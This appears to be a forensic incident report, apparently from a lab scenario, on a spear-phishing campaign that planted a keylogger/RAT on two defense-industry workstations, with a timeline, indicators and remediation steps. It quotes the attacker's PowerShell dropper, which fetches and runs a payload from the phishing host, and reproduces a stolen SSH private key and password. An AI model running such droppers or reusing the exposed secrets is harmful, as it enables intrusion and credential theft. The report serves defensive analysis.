# Incident Report — Targeted Defense Espionage Campaign
**Date of Incident:** 2026-03-29  
**Analyst:** Claude Code (Automated Analysis)  
**Classification:** CONFIDENTIAL

---

## Executive Summary

A targeted spear-phishing campaign successfully compromised two endpoints belonging to employees of Kongsberg Gruppen (`anders@kongsberg.com`) and Airbus (`john@airbus.com`). The attacker deployed a custom keylogger/RAT (Remote Access Trojan) disguised as a Windows updater. On the Kongsberg employee's machine, the attacker exfiltrated Vaultwarden credentials, an SSH private key, and — most critically — a **confidential internal email detailing a 3.5–4 billion NOK NASAMS air defense contract with Poland** that was not yet public knowledge. The malware avoids Russian-locale systems, consistent with a Russian-origin threat actor conducting defense industry espionage.

---

## Timeline Summary

| Time (UTC) | Event |
|---|---|
| 17:33 | Normal system activity observed on all hosts |
| 17:40–17:46 | `anders` browsing with Edge — multiple renderer processes |
| **17:46:32** | **Anders visits `f1leshare.net` (phishing page)** — targeted with `kongsberggrupper-insider` lure |
| 17:46:41 | Fake Fortinet CAPTCHA page loads with `anders@kongsberg.com` pre-filled |
| **17:46:55** | **PowerShell dropper executes** on `anders-desktop` (hidden, bypass) |
| **17:47:00** | **John visits `f1leshare.net`** — targeted with `norway-buys-80-jets` lure |
| 17:47:15 | Fake Fortinet CAPTCHA with `john@airbus.com` pre-filled |
| **17:47:19** | **`updater.exe` executes** on `anders-desktop` (parent: `powershell.exe`) |
| 17:47:19 | System beacon POSTed: `ANDERS-DESKTOP / anders / x64 / 4 CPUs / 8185 MB` |
| 17:47:20 | Malware copies itself to `%LOCALAPPDATA%\Microsoft\updater.exe` |
| 17:47:21 | Persistence: Registry `Run\MicrosoftUpdater` set |
| 17:47:21 | Persistence: `msteamsupdater.exe` dropped to Startup folder |
| 17:47:22 | DNS query for `miccosoftupdate.com` → `10.3.97.182` |
| 17:47:22 | Initial window/clipboard data exfiltrated (PowerShell cmd from clipboard) |
| **17:47:45** | **`updater.exe` executes** on `john-desktop` (parent: `powershell.exe`) |
| 17:47:49 | DNS query for `windowsupdater.tk` → `10.3.215.83` |
| 17:48:20 | C2 command result: `dir C:\Users` → users enumerated |
| 17:49:12 | `updater.exe` confirmed running on `john-desktop` |
| 17:49:20 | C2 command result: `dir C:\Users\anders\Documents` → empty |
| **17:50:50** | **C2 command result: `dir C:\Users\anders\Desktop`** → `polen.eml` found |
| **17:51:51** | **`polen.eml` exfiltrated** — confidential NASAMS deal with Poland |
| 17:52:04 | Keystrokes typed: URL `vaultwarden.ryo.no` captured |
| 17:52:28 | **Vaultwarden credentials stolen**: `anders@kongsberg.com` / `erkul123` |
| 17:52:32 | Keylogger confirms successful Vaultwarden login |
| **17:52:40** | **Ed25519 SSH private key exfiltrated** from clipboard |

---

## Motivation

**Defense industry espionage and potential insider trading.** The attacker crafted highly targeted lures specifically referencing Norwegian defense content:
- `kongsberggrupper-insider` — explicitly referencing insider information about Kongsberg Gruppen (Oslo: KOG)
- `norway-buys-80-jets` — referencing Norwegian military jet procurement
- Targeting was precise: `anders@kongsberg.com` (defense manufacturer) and `john@airbus.com` (aerospace competitor)

The successful theft of a non-public NASAMS defense contract worth 3.5–4 billion NOK could enable stock market manipulation, competitive intelligence for rival defense contractors, or intelligence gathering by a nation-state adversary.

---

## Attack Vector

**Spear-phishing via malicious file-sharing portal with Fortinet impersonation.**

The attacker operated a fake file-sharing site at `f1leshare.net` (IP: `10.3.124.26`) designed to look like a legitimate Fortinet-secured document portal. The phishing flow:

1. Victim receives a link to `http://f1leshare.net/?file=<tailored-lure>&share=<trusted-source>`
2. Page loads with Fortinet logo and branding (`/static/fortinet_logo.png`)
3. Victim is redirected to a CAPTCHA page with their email pre-filled:
   - `http://f1leshare.net/captcha?email=anders%40kongsberg.com&q=Fortinet/abh4whnesdgbw07f/Important+Download`
4. Solving the CAPTCHA delivers the PowerShell dropper (clipboard-injection technique):
   ```powershell
   PowerShell.exe -exec bypass -windowstyle hidden -command
   "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
   IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe
   -UseBasicParsing; & $env:TEMP\updater.exe"
   ```
5. `updater.exe` executes, establishing persistence and C2 communication

---

## Impact — What Was Compromised and Exfiltrated

### 1. System Reconnaissance (anders-desktop)
| Data | Value |
|---|---|
| Hostname | `ANDERS-DESKTOP` |
| Username | `anders` |
| Architecture | x64 |
| CPUs | 4 |
| RAM | 8185 MB |
| Local users | `anders`, `localuser`, `Public` |

### 2. Credential Theft — Vaultwarden Password Manager
- **URL:** `https://vaultwarden.ryo.no`
- **Username:** `anders@kongsberg.com`
- **Password:** `erkul123`
- **Impact:** Full access to Vaultwarden vault containing all stored credentials

### 3. SSH Private Key (Ed25519)
Stolen from clipboard at 17:52:40:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZgAAAIgVG358FRt+
fAAAAAtzc2gtZWQyNTUxOQAAACATPFdh+uiwntlTFtoBZL3Z93r9mPFrG0R+8gc3J6aWZg
AAAEDHlNIvcCmxaoT1pcOn30GIggyG+N4K4DkaxVhJSTv0CxM8V2H66LCe2VMW2gFkvdn3
ev2Y8WsbRH7yBzcnppZmAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
```

### 4. Confidential Defense Contract Email (HIGH VALUE TARGET)
**File:** `C:\Users\anders\Desktop\polen.eml`  
**Exfiltrated at:** 17:51:51 UTC via C2 shell command

| Field | Value |
|---|---|
| From | `Emil Andersson <emil.andersson@kongsberg.com>` |
| To | `Anders <anders@kongsberg.com>` |
| Subject | Polen NASAMS-avtale |
| Date | 2026-03-26 |

**Translated content:**
> Poland has confirmed the purchase of **NASAMS** (National Advanced Surface-to-Air Missile System) from Kongsberg. The deal is approximately **3.5–4 billion NOK**, including radar, command post, and launch units with long-range precision missiles. Full logistics and maintenance support included. Requires hiring **40–50 people in Poland**. **This information is not publicly known** — be careful about who you share this with.

### 5. Behavioral Intelligence (Keylog)
- Active browser tabs at time of infection (Hacker News, tech blogs)
- Navigation to Vaultwarden password manager
- Window titles revealing browsing history

---

## IOC Details

### Network Indicators

| Type | Value | Role |
|---|---|---|
| Domain | `f1leshare.net` | Phishing site / malware host |
| IP | `10.3.124.26` | Phishing site IP |
| URL | `http://f1leshare.net/download/updater` | Malware download |
| Domain | `miccosoftupdate.com` | C2 (typosquat of microsoft) |
| IP | `10.3.97.182` | C2 server 1 |
| URL | `http://miccosoftupdate.com/api/info` | System beacon endpoint |
| URL | `http://miccosoftupdate.com/api/data` | Data exfiltration endpoint |
| Domain | `windowsupdater.tk` | C2 server 2 |
| IP | `10.3.215.83` | C2 server 2 |
| URL | `http://windowsupdater.tk/windows/checkforupdate` | Command polling endpoint |
| URL | `http://windowsupdater.tk/update/servicedata` | Command result endpoint |
| User-Agent | `Mozilla/5.0` | Malware HTTP user-agent |

### File Indicators

| Type | Value |
|---|---|
| Download path | `C:\Users\anders\AppData\Local\Temp\updater.exe` |
| Persistence copy | `C:\Users\anders\AppData\Local\Microsoft\updater.exe` |
| Startup persistence | `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe` |
| Compiler | GCC 9.3-win32 / GCC 10-win32 (MinGW-w64) |
| Architecture | PE64 (x86-64 Windows executable) |

### Registry Indicators

| Key | Value |
|---|---|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` | `C:\Users\anders\AppData\Local\Microsoft\updater.exe` |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` | (Task scheduler stub) |

### Process Indicators

| Indicator | Value |
|---|---|
| Mutex | `Global\MicrosoftUpdateMutex` |
| Process name | `updater.exe` |
| Parent (initial) | `powershell.exe` |
| Spawned process | `cmd.exe /c <command>` (for C2 shell commands) |

### Behavioral Indicators (Malware Capabilities)

| Capability | Evidence |
|---|---|
| Keylogger | `GetAsyncKeyState` polling all 0x08–0xFF keys at 100ms intervals |
| Clipboard monitor | `GetClipboardData` / `OpenClipboard` / `CloseClipboard` |
| Window title capture | `GetForegroundWindow` / `GetWindowTextA` |
| System fingerprinting | `GetComputerNameA`, `GetUserNameA`, `GetSystemInfo`, `GlobalMemoryStatusEx` |
| Shell execution | `CreateProcessA` with `cmd.exe /c %s` |
| Anti-analysis (locale) | Exits if `GetSystemDefaultLCID()` == `0x419` (Russian) |
| Encryption | AES-128-ECB; keylog key = username; cmd output key = hostname |
| Encoding | Base64 (standard alphabet) |
| Persistence methods | Registry Run key, Startup folder, Task Scheduler registry stub |

### Victim Identifiers

| Host | User | Email | Infected | C2 Traffic |
|---|---|---|---|---|
| `anders-desktop` | `anders` | `anders@kongsberg.com` | Yes — 17:47:19 | Yes — confirmed exfiltration |
| `john-desktop` | `john` | `john@airbus.com` | Yes — 17:49:12 | No outbound C2 observed |

### Attribution Notes

- **Russian locale evasion** (`LCID 0x419`): Strong indicator of Russian-origin malware. Standard practice for Russian APT groups to avoid infecting domestic targets.
- **Target profile**: Western defense/aerospace employees (Kongsberg Gruppen, Airbus).
- **Lure content**: Norwegian F-35 procurement + Kongsberg insider information → consistent with intelligence collection against NATO defense capability.
- The combination of financial lures (`kongsberggrupper-insider` referencing stock exchange `nordnet.no`) and defense contract data suggests both financial and strategic espionage motives.

---

## Recommendations

1. **Immediate**: Revoke the stolen Ed25519 SSH key across all systems
2. **Immediate**: Reset `anders@kongsberg.com` Vaultwarden master password; rotate all vault credentials
3. **Immediate**: Isolate `anders-desktop` and `john-desktop` from network
4. **Short-term**: Block all IOC IPs/domains at perimeter (`10.3.124.26`, `10.3.97.182`, `10.3.215.83`, `f1leshare.net`, `miccosoftupdate.com`, `windowsupdater.tk`)
5. **Short-term**: Hunt for `updater.exe`, `msteamsupdater.exe`, registry key `MicrosoftUpdater` across all endpoints
6. **Short-term**: Assess NASAMS contract disclosure — notify legal and compliance teams
7. **Medium-term**: Implement PowerShell Constrained Language Mode and script block logging
8. **Medium-term**: Enforce endpoint firewall rules blocking outbound HTTP to non-approved destinations
